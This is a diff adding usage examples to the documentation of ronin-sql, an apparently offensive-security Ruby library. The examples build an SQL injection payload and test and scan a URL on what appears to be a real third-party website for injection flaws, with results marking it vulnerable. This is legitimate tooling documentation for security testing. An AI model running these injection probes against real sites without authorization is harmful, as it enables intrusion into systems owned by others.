@@ -67,6 +67,50 @@
         <shell>$ sudo gem install --no-rdoc ronin-sql</shell>
       </section>
 
+      <section label="examples" title="Examples">
+        <list>
+          <item>
+            Generate valid SQL using the Ronin SQL DSL:
+            <code>require 'ronin/code/sql'
+
+Code.sql {
+  select(:from =&gt; :users, :where => (name == 'bob'))
+}.to_s
+# =&gt; "SELECT * FROM users WHERE name = 'bob'"</code>
+          </item>
+
+          <item>
+            Generate valid SQL injections using the Ronin SQL injection DSL:
+            <code>Code.sql_injection {
+  escape_string { has_table?(:users) }
+}.to_s
+# =&gt; "' AND (SELECT count(*) FROM users) = 1 --"</code>
+          </item>
+
+          <item>
+            Test a URL for SQL Injection (SQLi):
+            <code>require 'ronin/sql'
+
+url = URI('http://redteatrosalternativos.com/_05enlaces/links/phpHoo3.php?viewCat=1')
+url.has_sqli?
+# => true</code>
+          </item>
+
+          <item>
+            Get the first viable SQLi vulnerability:
+            <code>url.first_sqli
+# =&gt; #&lt;Ronin::SQL::Injection:0x67d6d38cba60 @http_method=:get, @url=#&lt;URI::HTTP:0x67d6d8697190 URL:http://redteatrosalternativos.com/_05enlaces/links/phpHoo3.php?viewCat=1&gt;, @params={:http_method=&gt;:get}, @sql_options={:escape=&gt;"1"}, @param="viewCat"&gt;</code>
+          </item>
+
+          <item>
+            Scan a URL for SQLi vulnerabilities:
+            <code>url.sqli_scan
+# =&gt; [#&lt;Ronin::SQL::Injection:0x67d6d38792d8 @http_method=:get, @url=#&lt;URI::HTTP:0x67d6d8697190 URL:http://redteatrosalternativos.com/_05enlaces/links/phpHoo3.php?viewCat=1&gt;, @params={:http_method=&gt;:get}, @sql_options={:escape=&gt;"1"}, @param="viewCat"&gt;]
+            </code>
+          </item>
+        </list>
+      </section>
+
       <section label="development" title="Development">
         <list>
           <item>
